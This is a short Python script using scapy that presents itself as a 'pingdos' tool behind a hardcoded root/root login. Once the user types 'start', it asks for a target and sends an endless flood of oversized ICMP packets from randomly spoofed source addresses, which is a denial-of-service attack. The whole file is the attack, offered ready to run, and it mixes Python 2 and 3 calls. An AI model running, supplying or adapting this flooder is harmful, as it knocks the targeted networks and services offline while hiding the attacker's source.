from scapy.all import *
import random

def askLogin():
    username = input("Enter UserID: ")
    password = input("Enter Password: ")
    checkLogin(username, password)

def checkLogin(use, pwd):
    if use == "root" and pwd == "root":
        login(use)
    else:
        print ("Unauthorized User Or Incorrect Login")
        askLogin()

def login(use):
    while True:
        line = input('pingdos> ')
        if line == 'start':
            def address_spoofer():

                addr = [192, 168, 0 , 1]
                d = '.'
                addr[0] = str(random.randrange(11,197))
                addr[1] = str(random.randrange(0,255))
                addr[2] = str(random.randrange(0,255))
                addr[3] = str(random.randrange(2,254))
                assemebled = addr[0]+d+addr[1]+d+addr[2]+d+addr[3]
                print (assemebled)
                return assemebled

            target = raw_input("Enter the target to attack: ")

            while True:

                rand_addr = address_spoofer()
                ip_hdr = IP(src=rand_addr, dst=target)
                packet = ip_hdr/ICMP()/("m"*60000)
                send(packet)

askLogin()